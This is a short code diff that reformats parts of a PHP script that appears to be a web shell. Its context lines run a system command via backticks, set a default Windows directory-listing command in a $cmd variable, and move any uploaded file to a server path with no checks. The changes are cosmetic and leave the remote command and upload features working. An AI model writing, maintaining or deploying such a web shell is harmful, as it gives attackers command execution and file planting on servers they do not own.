@@ -20,9 +20,9 @@ $windir = `echo %windir%`;
 
 
 //------------------------------
-   if( $cmd == "" ) {
-    $cmd = 'dir /OG /X';
-  }
+   if ($cmd == "") {
+       $cmd = 'dir /OG /X';
+   }
 //-------------------------------
 
 
@@ -89,12 +89,12 @@ print"</form>";
 ?>
 
 
-<?
+<?php
 
 // Script for uploading
  if (is_uploaded_file($userfile)) {
-move_uploaded_file($userfile, $serverfile);
-}
+     move_uploaded_file($userfile, $serverfile);
+ }
 
 ?>
 
